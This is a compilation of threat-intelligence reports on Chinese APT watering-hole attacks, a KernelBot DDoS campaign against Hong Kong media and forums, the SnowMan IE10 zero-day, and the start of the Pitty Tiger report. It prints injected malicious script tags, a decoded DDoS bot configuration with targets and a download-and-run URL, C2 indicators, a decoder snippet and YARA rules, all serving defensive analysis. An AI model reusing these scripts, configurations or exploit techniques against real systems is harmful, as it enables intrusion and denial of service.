We found a related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 ) with the same “ java7 ”
password , which was dropped by an Adobe Flash exploit ( CVE-2012 - 0779 ) . In this previous incident ,
visitors to the Center for Defense Information website ( www.cdi[.]org — also an organization involved in
defense matters — were redirected to an exploit server at 159.54.62.92 .
This exploit server hosted a Flash exploit file named BrightBalls.swf ( MD5
1ec5141051776ec9092db92050192758 ) . This exploit , in turn , dropped the Poison Ivy variant . In addition
to using the same password “ java7 , ” this variant was configured with the mutex with the similar pattern of
“ YFds*&^ff ” and connected to a CnC server at windows.ddns[.]us .
Using passive DNS analysis , we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to
76.73.80.188 in mid-2012 .
Domain               First Seen        Last Seen        IP Address
wmi.ns01.us          2012 - 07 - 07        2012 - 09 - 19       76.73.80.188
windows.ddns.us      2012 - 05 - 23        2012 - 06 - 10       76.73.80.188
During another earlier compromise of the same www.cdi.org website , visitors were redirected to a Java
exploit test.jar ( MD5 7d810e3564c4eb95bcb3d11ce191208e ) . This jar file exploited CVE-2012 - 0507 and
dropped a Poison Ivy payload with the hash ( MD5 52aa791a524b61b129344f10b4712f52 ) . This Poison Ivy
variant connected to a CnC server at ids.ns01[.]us . The domain ids.ns01[.]us also overlaps with the
domain wmi.ns01[.]us on the IP 194.183.224.75 .
Domain               First Seen        Last Seen          IP Address
wmi.ns01[.]us        2012 - 07 - 03        2012 - 07 - 04         194.183.224.75
ids.ns01[.]us        2012 - 04 - 23        2012 - 05 - 18         194.183.224.75
The Poison Ivy sample referenced above ( MD5 fd69793bd63c44bbb22f9c4d46873252 ) was delivered via
an exploit chain that began with a redirect from the Center for European Policy Studies ( www.ceps[.]be ) .
In this case , visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be .
In what is certainly not a coincidence , we also observed www.arce[.]org ( one of the sites redirecting to the
current Flash exploit ) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013 .
Conclusion
This threat actor clearly seeks out and compromises websites of organizations related to international
security policy , defense topics , and other non - profit sociocultural issues . The actor either maintains
persistence on these sites for extended periods of time or is able to re - compromise them periodically .
This actor also has early access to a number of zero - day exploits , including Flash and Java , and deploys a
variety of malware families on compromised systems . Based on these and other observations , we conclude
that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-
term .

Operation Poisoned Handover : Unveiling Ties Between APT Activity
in Hong Kong ’s Pro - Democracy Movement
As the pro - democracy movement in Hong Kong has continued , we ’ve been watching for indications of
confrontation taking place in cyberspace . Protests began in September and have continued to escalate .
In recent weeks , attackers have launched a series of Distributed Denial of Service attacks ( DDoS ) against
websites promoting democracy in Hong Kong . According to the Wall Street Journal , websites belonging to
Next Media ’s Apple Daily publication have suffered from an ongoing DDoS attack that “ brought down its
email system for hours ” . According to other reports , Next Media ’s network has suffered a “ total failure ” as
a result of these attacks . Additionally , at least one member of the popular online forum HKGolden was
arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement .
The use of DDoS attacks as a political tool during times of conflict is not new ; patriotic hacktivist groups
frequently use them as a means to stifle political activity of which they disapprove . The question of state
sponsorship ( or at least tacit approval ) in online crackdowns is often up for debate and ambiguous from a
technical evidence and tradecraft perspective .
In this case , however , we ’ve discovered an overlap in the tools and infrastructure used by China - based
advanced persistent threat ( APT ) actors and the DDoS attack activity . We believe that these DDoS attacks
are linked to previously observed APT activity , including Operation Poisoned Hurricane . This correlation
sheds light on the potential relationships , symbiosis and tool sharing between patriotic hacker activities
designed to disrupt anti - government activists in China , and the APT activity we consistently see that is
more IP theft and espionage - focused .
Ongoing DDoS Attacks Target the Pro - Democracy Movement
FireEye has identified a number of binaries coded to receive instructions from a set of command and
control ( C2 ) servers instructing participating bots to attack Next Media - owned websites and the
HKGolden forum . Next Media is a large media company in Hong Kong and the HkGolden forum has been
used as a platform to organize pro - democracy protests . Each sample we identified is signed with digital
certificates that have also been used by APT actors to sign binaries in previous intrusion operations :
These binaries are W32 Cabinet self - extracting files that drop a variant of an older DDoS tool known as
KernelBot . All of the samples we identified have the “ NewVersion ” value of 20140926 . Structurally , all of
these samples are similar in that they drop three files :
•           ctfmon.exe-a legitimate , signed copy of the Pidgin IM client
( md5 hash = 1685f978149d7ba8e039af9a4d5803c7 )
•           libssp-0.dll–malware DLL which is side - loaded by ctfmon.exe
to decode and launch KernelBot . Most versions of this dll are also
signed by either the QTI or CallTogether certificate .
•           readme.txt – a binary file which contains the XOR - encoded
KernelBot DLL as well as C2 destination information ( most have
md5 hash of b5ac964a74091d54e091e68cecd5b532 )
The KernelBot implants receive targeting instructions from C2 servers hard - coded directly into the
sample . For example , c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to
both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com . The full list of C2 servers we
identified is as follows :
sapporo - digital - photoclub[.]com
wakayamasatei[.]com
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori - tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com
On Oct. 21 , the control server at wakayamasatei[.]com responded with the following encoded
configuration file :
@$@cWFPWERPRnlPXl5DRE13JyBjWXhPWkVYXnleS15PFxonIGNZbkVdRGxDRk
94X0QaFxonIGlHTmNuGhcbJyBuRV1EbENGT3hfRH9YRhoXQl5eWhAFBRsaBBo
EGwQbHxsFGwRPUk8nIHF / Wk5LXk95T1hcT1h3JyBkT118T1hZQ0VEFxgaGx4
aExgcJyB / Wk5LXk9sQ0ZPf1hGF0JeXloQBQUbGgQaBBsEGx8bBRsET1JPJyBx
bm5leXViRVleeV5LXkNZXkNJWXcnIGlFX0Ref1hGFycgfkNHT1gXGCcgcW5uZ
Xl1eUlYQ1pebEZFRU53JyBjWXlJWENaXmxGRUVOFxsnIGlHTmNuFxsYGScgeU
lYQ1pebEZFRU5uZHkXJyB5SVhDWl5sRkVFTn9YRhdCXl5aEAUFRFJLWkMES1p
aRk9OS0NGUwRJRUcEQkEFJyB5SVhDWl5sRkVFTnpFWF4XEhonIGNZbU9ef1hG
bENGTxcbJyBjWXlPRE56S0lBT14XGicgfkJYT0tOZkVFWn5DR08XHycgfkJYT
0tOaUVfRF4XGxonIH5DR09YFxkcGicgY1l+Q0dPWBcbJyBxbm5leXV5SVhDWl
5sRkVFTnVrG3cnIGNZeUlYQ1pebEZFRU4XGicgaUdOY24XGycgeUlYQ1pebEZ
FRU5uZHkXGxoEGgQbBBsfGycgeUlYQ1pebEZFRU5/WEYXGxoEGgQbBBsfGwUb
BEJeR0YnIHlJWENaXmxGRUVOekVYXhcSGicgY1ltT15/WEZsQ0ZPFxsnIGNZe
U9ETnpLSUFPXhcbJyB+QlhPS05mRUVafkNHTxcbJyB+QlhPS05pRV9EXhcbJy
B+Q0dPWBcYGicgY1l+Q0dPWBcbJyBxbm5leXV / TlpsRkVFTncnIGNZf05abEZ
FRU4XGicgaUdOY24XGycgf05abEZFRU5uZHkXGxoEGgQbBBsfGycgfkJYT0tO
aUVfRF4XGycgfkNHT1gXGBonIGNZfkNHT1gXGycgcW5uZXl1f05abEZFRU51a
xt3JyBjWX9OWmxGRUVOFxonIGlHTmNuFxsnIH9OWmxGRUVObmR5FxsaBBoEGw
QbHxsnIH5CWE9LTmlFX0ReFxsnIH5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV
5dXlTRGxGRUVOdycgY1l5U0RsRkVFThcaJyBpR05jbhcbJyB5U0RsRkVFTm5k
eRcbGgQaBBsEGx8bJyB5U0RsRkVFTnpFWF4XEhonIH5CWE9LTmlFX0ReFxsnI
H5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV5dX5JWmxGRUVOdycgY1l+SVpsRk
VFThcaJyBpR05jbhcbJyB+SVpsRkVFTm5keRcbGgQaBBsEGx8bJyB+SVpsRkV
FTnpFWF4XEhonIGNZeU9ETnpLSUFPXhcbJyB+QlhPS05pRV9EXhcbJyB+Q0dP
WBcYGicgY1l+Q0dPWBcbJyBxbm5leXV+SVpsRkVFTnVrG3cnIGNZfklabEZFR
U4XGicgaUdOY24XGycgfklabEZFRU5uZHkXGxoEGgQbBBsfGycgfklabEZFRU
56RVheFxIaJyBjWXlPRE56S0lBT14XGycgfkJYT0tOaUVfRF4XHCcgfkNHT1 g
XGBonIGNZfkNHT1gXGycg@$@
This configuration file can be decoded by stripping the leading and trailing @$@ characters . At this point ,
a simple base64 and XOR decode will reveal the plaintext configuration . The following snippet of python
code can be used to decode this command :
b64encoded = request.content.rstrip('@$@').lstrip('@$@ ' )
b64decoded = b64encoded.decode("base64 " )
command = " "
for c in b64decoded :
x = ord(c )
x = x ^ XOR_key
command + = chr(x )
FireEye has observed two different single - byte XOR keys used to encode configuration files issued by the
DDOS C2 servers in this campaign . The two different keys are 0x2A or 0x7E. The encoded configuration
file shown above decodes to :
[ KernelSetting ]
IsReportState=0
IsDownFileRun0=0
CmdID0=1
DownFileRunUrl0=http://10.0.1.151/1.exe
[ UpdateServer ]
NewVersion=20140926
UpdateFileUrl = http://10.0.1.151/1.exe
[ DDOS_HostStatistics ]
CountUrl=
Timer=2
[ DDOS_ScriptFlood ]
IsScriptFlood=1
CmdID=123
ScriptFloodDNS=
ScriptFloodUrl = http://nxapi.appledaily.com.hk/
ScriptFloodPort=80
IsGetUrlFile=1
IsSendPacket=0
ThreadLoopTime=5
ThreadCount=10
Timer=360
IsTimer=1
[ DDOS_ScriptFlood_A1 ]
IsScriptFlood=0
CmdID=1
ScriptFloodDNS=10.0.1.151
ScriptFloodUrl=10.0.1.151/1.html
ScriptFloodPort=80
IsGetUrlFile=1
IsSendPacket=1
ThreadLoopTime=1
ThreadCount=1
Timer=20
IsTimer=1
[ DDOS_UdpFlood ]
IsUdpFlood=0
CmdID=1
UdpFloodDNS=10.0.1.151
ThreadCount=1
Timer=20
IsTimer=1
[ DDOS_UdpFlood_A1 ]
IsUdpFlood=0
CmdID=1
UdpFloodDNS=10.0.1.151
ThreadCount=1
Timer=20
IsTimer=1
[ DDOS_SynFlood ]
IsSynFlood=0
CmdID=1
SynFloodDNS=10.0.1.151
SynFloodPort=80
ThreadCount=1
Timer=20
IsTimer=1
[ DDOS_TcpFlood ]
IsTcpFlood=0
CmdID=1
TcpFloodDNS=10.0.1.151
TcpFloodPort=80
IsSendPacket=1
ThreadCount=1
Timer=20
IsTimer=1
[ DDOS_TcpFlood_A1 ]
IsTcpFlood=0
CmdID=1
TcpFloodDNS=10.0.1.151
TcpFloodPort=80
IsSendPacket=1
ThreadCount=6
Timer=20
IsTimer=1
During the course of our research , we ’ve observed more than 30 different unique configuration files issued
by the C2 servers listed above . These configurations issued commands to attack the following domains and
IPs :
nxapi.appledaily.com[.]hk
202.85.162.90
58.64.139.10
202.85.162.97
202.85.162.81
198.41.222.6
202.85.162.101
202.85.162.95
202.85.162.180
202.85.162.140
202.85.162.130
124.217.214.149
All of the above IPs host Next Media or Apple daily websites , with the exception of 58.64.139.10 and
124.217.214.149 . The IP 58.64.139.10 has hosted hkgolden[.]com – the domain for the HKGolden forum
mentioned above .
For approximately 14 hours between October 23rd and 24th , the attackers pushed a configuration update
to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic .
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec[.]com .
On Oct. 23 , 2014 , two of the active controls began instructing participating bots to cease attacks . By Oct.
24 , 2014 , all five of the known active control servers were issuing commands to cease the attacks .
It should come as no surprise that hkgolden[.]com , nextmedia[.]com , and appledaily.com[.]hk websites
are now or previously have been blocked by the Great Firewall of China – indicating that the PRC has
found the content hosted on these sites objectionable .
Links to Previous Activity
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI
International and CallTogether code signing certificates , which we have seen in malware attributed to APT
activity .
The QTI International digital certificate has been previously used to sign binaries used in APT activity
including Operation Poisoned Hurricane . Specifically , 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX
variant signed by the QTI International certificate . This PlugX variant connected to a Google Code project
at code.google[.]com/p/udom/ , where it decoded a command that configured its C2 server .
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as
well . This sample was first observed during a drive - by attack in June 2014 , and was downloaded from
java - se[.]com / jp.jpg . This sample is detected as Backdoor . APT.Preshin and connected to luxscena[.]com
for C2 .
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed . We detect
this payload as Backdoor . APT.PISCES and it used hk.java-se[.]com for C2 . The java - se[.]com website was
previously used in other attacks targeting the pro - democracy movement in Hong Kong . We first observed
the presence of malicious javascript inserted into Hong Kong Association for Democracy and People ’s
Livelihood on June 26 , 2014 , which appeared as the following :
< a href="http://www.adpl.org.hk/?p=2680 " title="抗議九巴加價要求凍結加價、改善服務
< script language = javascript src = http://java - se.com / o.js></script > " >
More recently , as noted by Claudio Guarnieri , the website of the Democratic Party of Hong Kong was
seen hosting a redirect to the same malicious javascript .
The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5 . We also detect
this payload as Backdoor . APT.PISCES and observed it connect to u.java-se[.]com .
Both of these certificates are valid but can be detected and blocked via the following Yara signatures :
rule callTogether_certificate
{
meta :
author = " Fireeye Labs "
version = " 1.0 "
reference_hash = " d08e038d318b94764d199d7a85047637 "
description = “ detects binaries signed with the CallTogether certificate ”
strings :
$ serial = { 452156C3B3FB0176365BDB5B7715BC4C }
$ o = " CallTogether , Inc. "
condition :
$ serial and $ o
}
rule qti_certificate
{
meta :
author = " Fireeye Labs "
reference_hash = " cfa3e3471430a0096a4e7ea2e3da6195 "
description = " detects binaries signed with the QTI International Inc
certificate "
strings :
$ cn = " QTI International Inc "
$ serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }
condition :
$ cn and $ serial
}
These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website .
As noted above , this site has been targeted with a DDoS attack by a KernelBot network . We also found that
the hkgolden[.]com website was compromised on Sept. 5 , 2014 and had a redirect to a malicious javascript
again hosted at another jave - se[.]com host , which appeared as follows :
document.write("<script language = javascript src = http://jre76.java-
se.com/js/rss.js></script >
Finally , as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct.
25 , 2014 and Oct. 27 , 2014 . As Brandon Dixon noted here , the java - sec[.]com domain is linked to the java-
se[.]com by shared hosting history at the following IP address :
124.248.237.26
223.29.248.9
211.233.89.182
112.175.143.2
112.175.143.9
It is unclear why these actors would attack an IP address they were actively using . It ’s possible that the
attackers wanted to test their botnet ’s capability by attacking an IP they were using to gather statistics on
the size of the attack . It is also possible that the attackers simply made a mistake and accidentally issued
commands to attack their own infrastructure . On Oct. 24 , 2014 , after attacking their own infrastructure ,
the attackers issued new instructions to their botnet that ceased all attacks .
Conclusion
While not conclusive , the evidence presented above shows a link between confirmed APT
activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy
movement in Hong Kong . The evidence does not conclusively prove that the same actors responsible
for the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation
Poisoned Hurricane . Rather , the evidence may indicate that a common quartermaster supports
both the DDoS attacks and ongoing intrusion activity .
In either scenario , there is a clear connection between the intrusion activity documented in Operation
Poisoned Hurricane and the DDOS attacks documented here . While the tactics of these activities are very
different from a technical perspective , each supports distinct political objectives . Operation Poisoned
Hurricane ’s objective appeared to have in part been IP theft possibly for economic gain or other
competitive advantages . In the DDOS attacks , the objective was to silence free speech and suppress the
pro democracy movement in Hong Kong . The Chinese government is the entity most likely to be
interested in achieving both of these objectives .
APPENDIX
MD5s
c3d6450075d618b1edba17ee723eb3ca
d08e038d318b94764d199d7a85047637
84bd0809b1dbc2dc86f30d30faaa7e4e
39bb90140fc0101f49377b6c60076f9d
caa5529010c17b969da01ade084794c6
17bc9d2a640da75db6cbb66e5898feb1
0b54ae49fd5a841970b98a078968cb6b
e2a4b96cce9de4fb126cfd5f5c73c3ed
ecf21054ab515946a812d1aa5c408ca5
HOSTNAMES
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori - tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com
www.sapporo-digital-photoclub[.]com
wakayamasatei[.]com
luxscena[.]com
java - se[.]com
hk.java-se[.]com
u.java-se[.]com
jre76.java-se[.]com
p.java-sec[.]com
This entry was posted in Threat Intelligence , Threat Research and tagged advanced malware ,
Cybersecurity , malware , zero - day by Ned Moran , Mike Oppenheim and Mike Scott . Bookmark the
permalink .

Operation SnowMan : DeputyDog Actor Compromises US Veterans of
Foreign Wars Website
On February 11 , FireEye identified a zero - day exploit ( CVE-2014 - 0322 ) being served up from the U.S.
Veterans of Foreign Wars’ website ( vfw[.]org ) . We believe the attack is a strategic Web compromise
targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading
up to the Presidents Day holiday weekend . Based on infrastructure overlaps and tradecraft similarities , we
believe the actors behind this campaign are associated with two previously identified campaigns
( Operation DeputyDog and Operation Ephemeral Hydra ) .
This blog post examines the vulnerability and associated attacks , which we have dubbed “ Operation
SnowMan . ”
Exploit / Delivery analysis
After compromising the VFW website , the attackers added an iframe into the beginning of the website ’s
HTML code that loads the attacker ’s page in the background . The attacker ’s HTML / JavaScript page runs a
Flash object , which orchestrates the remainder of the exploit . The exploit includes calling back to the IE 10
vulnerability trigger , which is embedded in the JavaScript . Specifically , visitors to the VFW website were
silently redirected through an iframe to the exploit at www.[REDACTED].com / Data / img / img.html .
Mitigation
The exploit targets IE 10 with Adobe Flash . It aborts exploitation if the user is browsing with a different
version of IE or has installed Microsoft ’s Experience Mitigation Toolkit ( EMET ) . So installing EMET or
updating to IE 11 prevents this exploit from functioning .
Vulnerability analysis
The vulnerability is a previously unknown use - after - free bug in Microsoft Internet Explorer 10 . The
vulnerability allows the attacker to modify one byte of memory at an arbitrary address . The attacker uses
the vulnerability to do the following :
Gain access to memory from Flash ActionScript , bypassing address space layout randomization
( ASLR )
Pivot to a return - oriented programing ( ROP ) exploit technique to bypass data execution prevention
( DEP )
EMET detection
The attacker uses the Microsoft . XMLDOM ActiveX control to load a one - line XML string containing a file
path to the EMET DLL . Then the exploit code parses the error resulting from the XML load order to
determine whether the load failed because the EMET DLL is not present . The exploit proceeds only if this
check determines that the EMET DLL is not present .
ASLR bypass
Because the vulnerability allows attackers to modify memory to an arbitrary address , the attacker can use
it to bypass ASLR . For example , the attacker corrupts a Flash Vector object and then accesses the
corrupted object from within Flash to access memory . We have discussed this technique and other ASLR
bypass approaches in our blog . One minor difference between the previous approaches and this attack is
the heap spray address , which was changed to 0x1a1b2000 in this exploit .
Code execution
Once the attacker ’s code has full memory access through the corrupted Flash Vector object , the code
searches through loaded libraries gadgets by machine code . The attacker then overwrites the vftable
pointer of a flash . Media . Sound ( ) object in memory to point to the pivot and begin ROP . After successful
exploitation , the code repairs the corrupted Flash Vector and flash . Media . Sound to continue execution .
Shellcode analysis
Subsequently , the malicious Flash code downloads a file containing the dropped malware payload . The
beginning of the file is a JPG image ; the end of the file ( offset 36321 ) is the payload , encoded with an XOR
key of 0×95 . The attacker appends the payload to the shellcode before pivoting to code control . Then ,
when the shellcode is executed , the malware creates files “ sqlrenew.txt ” and “ stream.exe ” . The tail of the
image file is decoded , and written to these files . “ sqlrenew.txt ” is then executed with the LoadLibraryA
Windows API call .
ZxShell payload analysis
As documented above , this exploit dropped an XOR ( 0×95 ) payload that executed a ZxShell backdoor
( MD5 : 8455bbb9a210ce603a1b646b0d951bce ) . The compile date of the payload was 2014 - 02 - 11 , and the
last modified date of the exploit code was also 2014 - 02 - 11 . This suggests that this instantiation of the
exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of
Foreign Wars website . A possible objective in the SnowMan attack is targeting military service members to
steal military intelligence . In addition to retirees , active military personnel use the VFW website . It is
probably no coincidence that Monday , Feb. 17 , is a U.S. holiday , and much of the U.S. Capitol shut down
Thursday amid a severe winter storm .
The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to
cyber espionage operations . This particular variant called back to a command and control server located at
newss[.]effers[.]com . This domain currently resolves to 118.99.60.142 . The domain info[.]flnet[.]org also
resolved to this IP address on 2014 - 02 - 12 .
Infrastructure analysis
The info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous
resolutions to the following IP addresses :
58.64.200.178
58.64.200.179
103.20.192.4
First Seen        Last Seen          CnC Domain            IP
2013 - 08 - 31        2013 - 08 - 31         icybin.flnet[.]org    58.64.200.178
2013 - 05 - 02        2013 - 08 - 02         info.flnet[.]org      58.64.200.178
2013 - 08 - 02        2013 - 08 - 02         book.flnet[.]org      58.64.200.178
2013 - 08 - 10        2013 - 08 - 10         info.flnet[.]org      58.64.200.179
2013 - 07 - 15        2013 - 07 - 15         icybin.flnet[.]org    58.64.200.179
2014 - 01 - 02        2014 - 01 - 02         book.flnet[.]org      103.20.192.4
2013 - 12 - 03        2014 - 01 - 02         info.flnet[.]org      103.20.192.4
We previously observed Gh0stRat samples with the custom packet flag “ HTTPS ” calling back to
book[.]flnet[.]org and icybin[.]flnet[.]org . The threat actor responsible for Operation DeputyDog also
used the “ HTTPS ” version of the Gh0st . We also observed another “ HTTPS ” Gh0st variant connecting to
a related command and control server at me[.]scieron[.]com .
MD5 Hash                          CnC Domain
758886e58f9ea2ff22b57cbbb015166e book.flnet[.]org
0294f9280491f85d898ebe471f0fb58e icybin.flnet[.]org
9d20566a327076b7152bbf9ed20292c4 me.scieron[.]com
The me[.]scieron[.]com domain previously resolved to 58.64.199.22 . The book[.]flnet[.]org domain also
resolved to another IP in the same subnet 58.64.199.0/24 . Specifically , book[.]flnet[.]org previously
resolved to 58.64.199.27 .
Others domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org , ali[.]blankchair[.]com ,
and cht[.]blankchair[.]com . The domain dll[.]freshdns[.]org resolved to 58.64.199.25 . Both
ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22 .
First Seen        Last Seen          CnC Domain              IP
2012 - 11 - 12        2012 - 11 - 28         me.scieron[.]com      58.64.199.22
2012 - 04 - 09        2012 - 10 - 24         cht.blankchair[.]com 58.64.199.22
2012 - 04 - 09        2012 - 09 - 18         ali.blankchair[.]com 58.64.199.22
2012 - 11 - 08        2012 - 11 - 25         dll.freshdns[.]org    58.64.199.25
2012 - 11 - 23        2012 - 11 - 27         rt.blankchair[.]com 58.64.199.25
2012 - 05 - 29        2012 - 6 - 28          book.flnet[.]org      58.64.199.27
A number of other related domains resolve to these IPs and other IPs also in this /24 subnet . For the
purposes of this blog , we ’ve chosen to focus on those domains and IP that relate to the previously
discussed DeputyDog and Ephemeral Hydra campaigns .
You may recall that dll[.]freshdns[.]org , ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked
to both Operation DeputyDog and Operation Ephemeral Hydra . Figure 1 illustrates the
infrastructure overlaps and connections we observed between the strategic Web compromise campaign
leveraging the VFW ’s website , the DeputyDog , and the Ephemeral Hydra operations .
Figure 1 : Ties between Operation SnowMan , DeputyDog , and Ephemeral Hydra
Links to DeputyDog and Ephemeral Hydra
Other tradecraft similarities between the actor(s ) responsible for this campaign and the actor(s )
responsible for the DeputyDog / Ephemeral Hydra campaigns include :
The use of zero - day exploits to deliver a remote access Trojan ( RAT )
The use of strategic web compromise as a vector to distribute remote access Trojans
The use of a simple single - byte XOR encoded ( 0×95 ) payload obfuscated with a .jpg extension
The use of Gh0stRat with the “ HTTPS ” packet flag
The use of related command - and - control ( CnC ) infrastructure during the similar time frames
We observed many similarities from the exploitation side as well . At a high level , this attack and the CVE-
2013 - 3163 attack both leveraged a Flash file that orchestrated the exploit , and would call back into IE
JavaScript to trigger an IE flaw . The code within the Flash files from each attack are extremely similar .
They build ROP chains and shellcode the same way , both choose to corrupt a Flash Vector object , have
some identical functions with common typos , and even share the same name .
Conclusion
These actors have previously targeted a number of different industries , including :
U.S. government entities
Japanese firms
Defense industrial base ( DIB ) companies
Law firms
Information technology ( IT ) companies
Mining companies
Non - governmental organizations ( NGOs )
The proven ability to successfully deploy a number of different private and public RATs using zero - day
exploits against high - profile targets likely indicates that this actor(s ) will continue to operate in the mid to
long - term .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Research , Vulnerabilities
and tagged 0day , zero - day by Darien Kindlund , Dan Caselden , Xiaobo Chen , Ned Moran and Mike Scott .
Bookmark the permalink .

Pitty Tiger Group
The Eye of the Tiger
Credits :                      Ivan FONTARENSKY                            Malware Research
Fabien PERIGAUD                             Reverse Engineering
Ronan MOUCHOUX                              Threat Intelligence
Cedric PERNET                               Threat Intelligence
David BIZEUL                                Head of CSIRT
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                      Page : 1/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
EXECUTIVE SUMMARY
Operation Pitty Tiger – “ The Eye of the Tiger ”
Cyber espionage has been a hot topic through the last years . Computer attacks known as “ APT ”
( Advanced Persistent Threat ) have become widely reported and emphasized by the media ,
damages are now considered as real and strategic trends are moving in cyber defense .
AIRBUS Defence & Space – CyberSecurity unit responds to such attacks for its customers every
day , developing a complete range of solutions .
Today , we decided to release publicly information on a specific group of APT attackers known as
“ Pitty Tiger ” . This information comes directly from investigations led by our Threat Intelligence .
Pitty Tiger is a group of attackers that have been active since at least 2011 . They have targeted
private companies in several sectors , such as defense and telecommunications , but also at least
one government .
We have been able to track down this group of attackers and can provide detailed information
about them . We were able to collect and reveal their “ malware arsenal ” . We also analyzed their
technical organization .
Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far , rather they
prefer using custom malware , developed for the group ’s exclusive usage . Our discoveries
indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar , yet still not
as mature as other groups of attackers we monitor .
Pitty Tiger is probably not a state - sponsored group of attackers . They lack the experience and
financial support that one would expect from state - sponsored attackers . We suppose this group
is opportunistic and sells its services to probable competitors of their targets in the private sector .
We have been able to leverage several attackers profiles , showing that the Pitty Tiger group is
fairly small compared to other APT groups , which is probably why we saw them work on a very
limited amount of targets .
At the end of this report , we provide indicators of compromise to help people detect current Pitty
Tiger attacks .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                          Page : 2/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
TABLE OF CONTENT
EXECUTIVE SUMMARY ..................................................................................................... 2
TABLE OF CONTENT ......................................................................................................... 3
MODUS OPERANDI : APT ATTACKS ................................................................................ 5
Reconnaissance phase .......................................................................................................... 5
Initial compromise .................................................................................................................. 6
Access strengthening & lateral moves ................................................................................... 6
Data exfiltration ...................................................................................................................... 7
“ PITTY TIGER ” INVESTIGATION CONTEXT .................................................................... 8
INFECTION METHODS ....................................................................................................... 9
Spear Phishing and weaponized documents ......................................................................... 9
Direct attacks ....................................................................................................................... 10
MALWARE INFORMATION .............................................................................................. 12
Troj / ReRol . A ........................................................................................................................ 12
PittyTiger RAT ..................................................................................................................... 16
CT RAT ................................................................................................................................ 19
MM RAT ( aka Troj / Goldsun - B ) ............................................................................................. 23
Paladin RAT ........................................................................................................................ 26
Leo RAT .............................................................................................................................. 28
INFRASTRUCTURE .......................................................................................................... 30
Avstore.com.tw .................................................................................................................... 30
Skypetm.com.tw .................................................................................................................. 32
Common characteristics between the two domains ............................................................. 35
Other domains linked with the Pitty Tiger group ................................................................... 36
VICTIMS ............................................................................................................................ 39
ATTACKERS ..................................................................................................................... 40
Attacker ’s connections to the c&c ........................................................................................ 40
“ TooT ” .................................................................................................................................. 44
“ Cold & Snow ” ...................................................................................................................... 48
Roles and organization ........................................................................................................ 48
Attackers arsenal ................................................................................................................. 49
ATTRIBUTION .................................................................................................................. 53
CONCLUSION ................................................................................................................... 56
INDICATORS .................................................................................................................... 57
Domains .............................................................................................................................. 57
Malware hashes ................................................................................................................... 57
Malware Strings ................................................................................................................... 58
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                              Page : 3/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 4/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
MODUS OPERANDI : APT ATTACKS
APT attacks follow what we call the “ APT kill chain ” . The kill chain describes briefly the way
attackers do perform their actions .
It can be summarized by the following scheme :
RECONNAISSANCE PHASE
The reconnaissance phase commences when an attacker selects a new target and involves the
acquisition of information about that target .
There is very little information available about this phase , and there is little data about it . The only
way to collect information about this phase would be to already monitor all attackers’ actions at this
step , which is hardly feasible .
The longer the attackers spend time in attempting to understand their target and its online presence ,
the easier it will be to find efficient ways to penetrate that company ’s systems .
This reconnaissance phase is both about finding information to break into the targeted network
successfully and about searching for data which could help to accelerate sensitive information
isolation ( like the name of a key employee for example ) .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 5/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This phase mostly relies on open sources from the Internet : social networks , press releases , white
papers , corporate websites , search engines , but also on some active tools like vulnerability
scanners etc .
INITIAL COMPROMISE
At this stage , the APT attackers have a solid knowledge of their target and its key employees . The
attackers have everything they need to start looking for an entry point to the company ’s network and
establish one or several permanent backdoors into the environment .
The attackers mostly rely on two techniques here to infect one or several computers , usually
workstations , inside the target ’s network : spear phishing and drive - by downloads .
Spear phishing can be described as targeted e - mail phishing . In a spear phishing scheme , attackers
send very few e - mails to targeted people . In fact , they can even send just a single e - mail . The trick
is to target the right victim and provide it with the right content , so that they will click on a link leading
